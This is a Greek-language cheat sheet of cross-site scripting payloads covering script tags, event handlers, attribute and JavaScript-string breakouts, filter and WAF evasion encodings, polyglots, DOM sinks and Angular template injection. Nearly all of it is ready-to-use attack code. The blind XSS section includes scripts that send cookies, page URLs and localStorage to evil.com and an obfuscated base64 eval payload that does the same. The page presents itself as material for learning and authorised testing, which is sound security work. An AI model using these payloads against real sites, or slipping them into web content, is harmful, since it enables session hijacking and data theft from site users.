# 💉 Συλλογή δοκιμαστικών εισόδων XSS

<!-- language-home-navigation -->
[🏠 Ελληνική αρχική σελίδα](../../README.el.md) • [🌐 Languages](../../README.md#-available-languages)

[🇬🇧 English](../XSS.md) • [🇹🇷 Türkçe Sürüm](XSS.tr.md)

```
  ██╗  ██╗███████╗███████╗    ██████╗  █████╗ ██╗   ██╗██╗      ██████╗  █████╗ ██████╗ ███████╗
  ╚██╗██╔╝██╔════╝██╔════╝    ██╔══██╗██╔══██╗╚██╗ ██╔╝██║     ██╔═══██╗██╔══██╗██╔══██╗██╔════╝
   ╚███╔╝ ███████╗███████╗    ██████╔╝███████║ ╚████╔╝ ██║     ██║   ██║███████║██║  ██║███████╗
   ██╔██╗ ╚════██║╚════██║    ██╔═══╝ ██╔══██║  ╚██╔╝  ██║     ██║   ██║██╔══██║██║  ██║╚════██║
  ██╔╝ ██╗███████║███████║    ██║     ██║  ██║   ██║   ███████╗╚██████╔╝██║  ██║██████╔╝███████║
  ╚═╝  ╚═╝╚══════╝╚══════╝    ╚═╝     ╚═╝  ╚═╝   ╚═╝   ╚══════╝ ╚═════╝ ╚═╝  ╚═╝╚═════╝ ╚══════╝
```

---

## Πριν ξεκινήσετε

Το **XSS (Cross-Site Scripting)** αφορά μη έμπιστα δεδομένα που ερμηνεύονται ως κώδικας στην ιστοσελίδα. **Payload** είναι η δοκιμαστική είσοδος, **context** το πλαίσιο ερμηνείας της, **source** η προέλευσή της και **sink** το σημείο όπου χρησιμοποιείται. Το **DOM** είναι η δομή της σελίδας που χειρίζεται ο browser.

Επιλέξτε παράδειγμα σύμφωνα με το πραγματικό πλαίσιο: κείμενο HTML, γνώρισμα, συμβολοσειρά JavaScript ή URL. Η απλή εμφάνιση του payload δεν αποδεικνύει εκτέλεση. Η συμπεριφορά εξαρτάται από browser, κωδικοποίηση, φίλτρα και πολιτικές όπως CSP. Τα δείγματα παραμένουν όπως στο αγγλικό πρωτότυπο.

## 📋 Περιεχόμενα

- [Βασικά δοκιμαστικά payloads](#section-01)
- [Δοκιμές με χειριστές συμβάντων](#section-02)
- [Εισαγωγή σε attributes — γνωρίσματα HTML](#section-03)
- [Πλαίσιο JavaScript](#section-04)
- [Παραλλαγές για έλεγχο φίλτρων](#section-05)
- [Δοκιμές φίλτρων WAF](#section-06)
- [Polyglot — είσοδοι για περισσότερα πλαίσια](#section-07)
- [Τυφλό XSS (Blind XSS)](#section-08)
- [XSS μέσω DOM](#section-09)
- [Γρήγορη αναφορά ανά πλαίσιο](#section-10)
- [Πηγές](#section-11)

---

<a id="section-01"></a>

## 🔴 Βασικά δοκιμαστικά payloads

> **Πλαίσιο και συμβατότητα:** Δεν εκτελείται κάθε ετικέτα ή event handler σε κάθε browser. Η αυτοκλειόμενη σύνταξη script και το javascript σε img δεν είναι γενικοί τρόποι εκτέλεσης. Επιβεβαιώστε τι καταλήγει στο DOM και τι εκτελείται πραγματικά.


### Κλασικές ετικέτες script

```html
<script>alert('XSS')</script>
<script>alert(1)</script>
<script>alert(document.domain)</script>
<script>alert(document.cookie)</script>
<script>confirm('XSS')</script>
<script>prompt('XSS')</script>
<script>console.log('XSS')</script>
```

### Αυτοκλειόμενες ετικέτες

```html
<script src="https://evil.com/xss.js"/>
<script src=//evil.com/xss.js></script>
<script/src="https://evil.com/xss.js"></script>
```

### Εξωτερικό script

```html
<script src="https://evil.com/xss.js"></script>
<script src="data:text/javascript,alert(1)"></script>
<script src="data:,alert(1)"></script>
```

---

<a id="section-02"></a>

## ⚡ Δοκιμές με χειριστές συμβάντων

### Συμβάντα εικόνων

```html
<img src=x onerror=alert('XSS')>
<img src=x onerror="alert('XSS')">
<img/src=x onerror=alert('XSS')>
<img src="x" onerror="alert(1)">
<img src=1 onerror=alert(1)>
<img src=/ onerror=alert(1)>
<img src="javascript:alert(1)">
<img onload=alert('XSS') src="valid.jpg">
```

### Συμβάντα SVG

```html
<svg onload=alert('XSS')>
<svg/onload=alert('XSS')>
<svg onload="alert('XSS')">
<svg><script>alert(1)</script></svg>
<svg><script>alert&#40;1&#41;</script></svg>
```

### Συμβάντα του body

```html
<body onload=alert('XSS')>
<body onpageshow=alert('XSS')>
<body onfocus=alert('XSS')>
<body onhashchange=alert('XSS')>
<body onscroll=alert('XSS')>
```

### Συμβάντα πεδίων εισόδου

```html
<input onfocus=alert('XSS') autofocus>
<input onblur=alert('XSS') autofocus><input autofocus>
<input type="image" src=x onerror=alert('XSS')>
<input type="text" onfocus="alert('XSS')" autofocus>
```

### Άλλοι χειριστές συμβάντων

```html
<marquee onstart=alert('XSS')>
<video src=x onerror=alert('XSS')>
<audio src=x onerror=alert('XSS')>
<details open ontoggle=alert('XSS')>
<iframe onload=alert('XSS')>
<object data=javascript:alert('XSS')>
<embed src=javascript:alert('XSS')>
<a onmouseover=alert('XSS')>click me</a>
<div onmouseover=alert('XSS')>hover me</div>
<form onsubmit=alert('XSS')><input type=submit>
<select onfocus=alert('XSS') autofocus>
<textarea onfocus=alert('XSS') autofocus>
```

---

<a id="section-03"></a>

## 🔗 Εισαγωγή σε attributes — γνωρίσματα HTML

### Έξοδος από το πλαίσιο ενός γνωρίσματος

```html
"><script>alert('XSS')</script>
"><img src=x onerror=alert('XSS')>
'><script>alert('XSS')</script>
'><img src=x onerror=alert('XSS')>
"><svg onload=alert('XSS')>
" onmouseover="alert('XSS')
' onmouseover='alert(1)'
" onfocus="alert('XSS')" autofocus "
```

### Συμβάντα μέσα σε γνωρίσματα

```html
" onclick=alert('XSS') "
" onmouseover=alert('XSS') "
" onfocus=alert('XSS') autofocus "
" onload=alert('XSS') "
```

### Γνώρισμα style σε παλιούς browsers

```html
<div style="background:url(javascript:alert('XSS'))">
<div style="width:expression(alert('XSS'))">
```

---

<a id="section-04"></a>

## 📜 Πλαίσιο JavaScript

### Έξοδος από το αρχικό πλαίσιο JavaScript

```javascript
';alert('XSS');//
";alert('XSS');//
</script><script>alert('XSS')</script>
'-alert('XSS')-'
"-alert('XSS')-"
\';alert(1)//
\";alert(1)//
```

### Συμβολοσειρές προτύπου JavaScript

```javascript
${alert('XSS')}
`${alert(1)}`
${alert`XSS`}
```

### Μέσα σε JSON

```json
{"name":"test","value":"</script><script>alert(1)</script>"}
```

---

<a id="section-05"></a>

## 🔓 Παραλλαγές για έλεγχο φίλτρων

### Παραλλαγές πεζών και κεφαλαίων

```html
<ScRiPt>alert('XSS')</ScRiPt>
<SCRIPT>alert('XSS')</SCRIPT>
<scRIPT>alert('XSS')</scRIPT>
<IMG SRC=x OnErRoR=alert('XSS')>
```

### Διάσπαση ετικετών

```html
<scr<script>ipt>alert('XSS')</scr</script>ipt>
<sc\x00ript>alert('XSS')</sc\x00ript>
<scr\x09ipt>alert('XSS')</scr\x09ipt>
```

### Κωδικοποίηση με οντότητες HTML

```html
<img src=x onerror=&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;>
<img src=x onerror=&#x61;&#x6C;&#x65;&#x72;&#x74;&#x28;&#x31;&#x29;>
<a href="&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;">click</a>
```

### Κωδικοποίηση URL

```html
<img src=x onerror=%61%6c%65%72%74%28%31%29>
<a href="javascript:%61%6c%65%72%74%28%31%29">click</a>
```

### Κωδικοποίηση Unicode

```html
<script>\u0061\u006C\u0065\u0072\u0074(1)</script>
<script>eval('\u0061\u006c\u0065\u0072\u0074(1)')</script>
```

### Εισαγωγή null byte

```html
<scr\x00ipt>alert('XSS')</scr\x00ipt>
<img src=x onerror=alert('XSS')\x00>
```

### Παραλλαγές λευκών χαρακτήρων

```html
<img/src=x/onerror=alert('XSS')>
<img\nsrc=x\nonerror=alert('XSS')>
<img\tsrc=x\tonerror=alert('XSS')>
<img src=x	onerror=alert('XSS')>
```

### Χωρίς παρενθέσεις

```html
<script>alert`XSS`</script>
<script>onerror=alert;throw'XSS'</script>
<img src=x onerror=alert`1`>
<img src=x onerror="window['alert'](1)">
```

### Χωρίς εισαγωγικά

```html
<script>alert(String.fromCharCode(88,83,83))</script>
<img src=x onerror=alert(1)>
<img src=x onerror=alert(/XSS/)>
```

---

<a id="section-06"></a>

## 🛡️ Δοκιμές φίλτρων WAF

### Διπλή κωδικοποίηση

```html
%253Cscript%253Ealert(1)%253C/script%253E
%3C%73%63%72%69%70%74%3E%61%6C%65%72%74%28%31%29%3C%2F%73%63%72%69%70%74%3E
```

### Χρήση σχολίων

```html
<script>/**/alert('XSS')/**/</script>
<img src=x onerror=/**/alert(1)/**//>
<!--<script>-->alert(1)<!--</script>-->
```

### Αλλαγές γραμμής

```html
<script>
alert('XSS')
</script>

<img src=x
onerror
=
alert(1)>
```

### Εναλλακτικές ετικέτες

```html
<math><mi//xlink:href="data:x,<script>alert(1)</script>">
<math><maction xlink:href="javascript:alert(1)">click
<isindex action="javascript:alert(1)" type=submit value=click>
```

### Παραλλαγές με SVG

```html
<svg><animate onbegin=alert(1) attributeName=x dur=1s>
<svg><set onbegin=alert(1) attributename=x dur=1s>
<svg/onload=alert(1)>
```

### Χρήση της `eval`

```html
<script>eval(atob('YWxlcnQoMSk='))</script>
<img src=x onerror="eval(atob('YWxlcnQoMSk='))">
```

### Χρήση `setTimeout`/`setInterval`

```html
<script>setTimeout('alert(1)',0)</script>
<script>setInterval('alert(1)',0)</script>
<img src=x onerror=setTimeout('alert(1)')>
```

### Χρήση της `fetch`

```html
<script>fetch('https://evil.com/'+document.cookie)</script>
```

---

<a id="section-07"></a>

## 🎭 Polyglot — είσοδοι για περισσότερα πλαίσια

### Polyglots XSS για διαφορετικά πλαίσια

```html
jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcLiCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e

'">><marquee><img src=x onerror=confirm(1)></marquee>"></plaintext\></|\><plaintext/onmouseover=prompt(1)><script>prompt(1)</script>@gmail.com<isindex formaction=javascript:alert(/XSS/) type=submit>'-->"></script><script>alert(1)</script>"><img/id="confirm&lpar;1)"/alt="/"src="/"onerror=eval(id&%23telecomhallx27telecomhall;)>'">

"><img src=x onerror=alert(1)//>'\"><img src=x onerror=alert(1)//><img src=x onerror=alert(1)//>'\"

javascript:/*--></title></style></textarea></script></xmp><svg/onload='+/"/+/onmouseover=1/+/[*/[]/+alert(1)//'>
```

### Σύντομο polyglot

```html
'"><script>alert(1)</script>
'"><img src=x onerror=alert(1)>
```

---

<a id="section-08"></a>

## 👁️ Τυφλό XSS (Blind XSS)

> **Ελάχιστη τεκμηρίωση:** Τα πρωτότυπα περιλαμβάνουν αποστολή cookies και localStorage σε εξωτερικό προορισμό. Μελετήστε τα με συνθετικά δεδομένα και δική σας υπηρεσία παρατήρησης. Το HttpOnly αποκλείει πρόσβαση JavaScript στα αντίστοιχα cookies. Ένα callback χρειάζεται συσχέτιση και δεν αποδεικνύει μόνο του όλο τον αντίκτυπο.


### Παραδείγματα αποστολής cookies

```html
<script>new Image().src="https://evil.com/steal?c="+document.cookie</script>
<script>fetch('https://evil.com/'+document.cookie)</script>
<img src=x onerror="this.src='https://evil.com/?c='+document.cookie">
```

### Εξαγωγή δεδομένων εκτός του συστήματος (Data Exfiltration)

```html
<script>
var i=new Image();
i.src="https://evil.com/?cookie="+document.cookie+"&url="+document.URL;
</script>

<script>
fetch('https://evil.com/collect',{
    method:'POST',
    body:JSON.stringify({
        cookie:document.cookie,
        url:location.href,
        localStorage:JSON.stringify(localStorage)
    })
})
</script>
```

### Δοκιμαστικές είσοδοι XSS Hunter

```html
"><script src=https://xss.ht></script>
"><img src=x onerror="eval(atob('ZG9jdW1lbnQubG9jYXRpb249J2h0dHBzOi8veHNzLmh0Lz9jPScrZG9jdW1lbnQuY29va2ll'))">
```

### Blind XSS σε φόρμες

```html
"><script src="https://your.xss.ht"></script>
test@test.com"><script src="https://your.xss.ht"></script>
{{constructor.constructor('fetch("https://your.xss.ht?c="+document.cookie)')()}}
```

---

<a id="section-09"></a>

## 🌐 XSS μέσω DOM

> **Source προς sink:** Ένα URL fragment ή μια παράμετρος δεν εκτελείται από μόνη της. Χρειάζεται συγκεκριμένη ροή μη έμπιστων δεδομένων σε επικίνδυνη χρήση. Οι συμπεριφορές jQuery και Angular εξαρτώνται από έκδοση και τρόπο χρήσης.


### Πηγές εισόδου για DOM XSS

```javascript
// Τμήμα URL μετά το #
https://example.com#<script>alert(1)</script>

// Παράμετρος URL
https://example.com?name=<script>alert(1)</script>

// document.referrer
Referer: <script>alert(1)</script>
```

### Συνήθη σημεία χρήσης μη έμπιστων δεδομένων

```javascript
// innerHTML
document.getElementById('x').innerHTML = userInput;
// Payload: <img src=x onerror=alert(1)>

// document.write
document.write(userInput);
// Payload: <script>alert(1)</script>

// eval
eval(userInput);
// Payload: alert(1)

// location
location = userInput;
location.href = userInput;
// Payload: javascript:alert(1)
```

### Σημεία χρήσης δεδομένων στη jQuery

```javascript
// $().html()
$('#x').html(userInput);
// Payload: <img src=x onerror=alert(1)>

// $()
$(userInput);
// Payload: <img src=x onerror=alert(1)>

// $.parseHTML()
$.parseHTML(userInput);
// Payload: <img src=x onerror=alert(1)>
```

### Δοκιμαστικές είσοδοι Angular

```html
{{constructor.constructor('alert(1)')()}}
{{$on.constructor('alert(1)')()}}
{{$eval.constructor('alert(1)')()}}
```

---

<a id="section-10"></a>

## 📊 Γρήγορη αναφορά ανά πλαίσιο

### Πλαίσιο HTML
```html
<script>alert(1)</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
```

### Πλαίσιο γνωρίσματος HTML
```html
" onmouseover="alert(1)
"><script>alert(1)</script>
' onfocus='alert(1)' autofocus='
```

### Πλαίσιο συμβολοσειράς JavaScript
```javascript
';alert(1)//
"-alert(1)-"
</script><script>alert(1)</script>
```

### Πλαίσιο URL
```html
javascript:alert(1)
data:text/html,<script>alert(1)</script>
```

---

<a id="section-11"></a>

## 📚 Πηγές

- [PortSwigger XSS Cheatsheet](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet)
- [OWASP XSS Filter Evasion](https://owasp.org/www-community/xss-filter-evasion-cheatsheet)
- [PayloadsAllTheThings XSS](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/XSS%20Injection)

---

<p align="center">
  <b>💉 Συλλογή δοκιμαστικών εισόδων XSS</b><br>
  <i>Για μάθηση και εξουσιοδοτημένους ελέγχους.</i>
</p>

**Επιστροφή:** [Ελληνική αρχική σελίδα](../../README.el.md)
